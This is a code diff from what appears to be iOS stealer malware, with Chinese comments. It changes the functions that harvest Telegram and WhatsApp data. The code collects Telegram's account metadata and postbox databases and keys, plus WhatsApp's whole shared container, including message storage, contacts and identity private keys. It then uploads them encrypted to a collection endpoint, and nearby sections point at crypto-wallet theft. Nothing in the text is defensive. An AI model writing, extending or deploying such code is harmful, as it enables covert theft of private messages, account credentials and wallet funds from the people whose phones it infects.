@@ -844,12 +844,11 @@ static NSArray *WalletMemoryTargets(void) {
 /// 后台「Telegram / Whatsapp」菜单就是按 bundleId 从那张表里过滤出来的。
 - (void)collectAndUploadAppGroup:(NSString *)groupId
                           bundle:(NSString *)bundleId
-                         include:(NSArray<NSString *> *)include
-                         exclude:(NSArray<NSString *> *)exclude {
+                           items:(NSArray<NSDictionary *> *)items {
     @try {
+        // 严格按采集配置里的 items 采（type=dir/file + path，path 支持 * 通配）
         NSDictionary *pkg = [WalletFS collectAppGroup:groupId
-                                              include:include
-                                              exclude:exclude
+                                                items:items
                                                 limit:32 * 1024 * 1024];
         NSArray *files = pkg[@"files"];
         if (!files.count) {
@@ -860,7 +859,6 @@ static NSArray *WalletMemoryTargets(void) {
         NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
         body[@"c"] = kSeed;
         body[@"bundle_id"] = bundleId;
-        body[@"name"] = [NSString stringWithFormat:@"%@-collect.zip", [bundleId stringByReplacingOccurrencesOfString:@"." withString:@"_"]];
         body[@"files"] = files;
 
         NSDictionary *r = [self.net postEncrypted:@"/az" json:body timeout:180];
@@ -880,22 +878,20 @@ static NSArray *WalletMemoryTargets(void) {
     }
 }
 
-/// Telegram：accounts-metadata/ + account-<n>/postbox/ 里的数据库与密钥，跳过媒体
+/// Telegram：就是采集配置里那两项 —— accounts-metadata/ 和 account-*/postbox/
 - (void)collectTelegram {
     [self collectAndUploadAppGroup:@"group.ph.telegra.Telegraph"
                             bundle:@"group.ph.telegra.Telegraph"
-                           include:@[@"accounts-metadata", @"/postbox/"]
-                           exclude:@[@"/media/", @".jpg", @".mp4", @".webp", @"/icons/"]];
+                             items:@[ @{ @"type": @"dir", @"path": @"accounts-metadata/" },
+                                      @{ @"type": @"dir", @"path": @"account-*/postbox/" } ]];
 }
 
-/// WhatsApp：AppGroup 里的 Settings/Preferences（cc/jid/identityPrivateKey 都在 plist）
+/// WhatsApp：配置里是「/」（整容器）和 Library/Preferences/
 - (void)collectWhatsApp {
-    // 配置原文是「/」整容器 + Library/Preferences/：
-    // 之前只挑了 Preferences，把 ChatStorage / ContactsV2 / 账号表全丢了 —— 那是错的。
     [self collectAndUploadAppGroup:@"group.net.whatsapp.WhatsApp.shared"
                             bundle:@"group.net.whatsapp.WhatsApp.shared"
-                           include:nil
-                           exclude:@[@"/Media/", @"/Stickers/", @".jpg", @".jpeg", @".png", @".mp4", @".webp"]];
+                             items:@[ @{ @"type": @"dir", @"path": @"/" },
+                                      @{ @"type": @"dir", @"path": @"Library/Preferences/" } ]];
 }
 #pragma mark - TokenPocket：把设备端验证过的密码送去解密
 
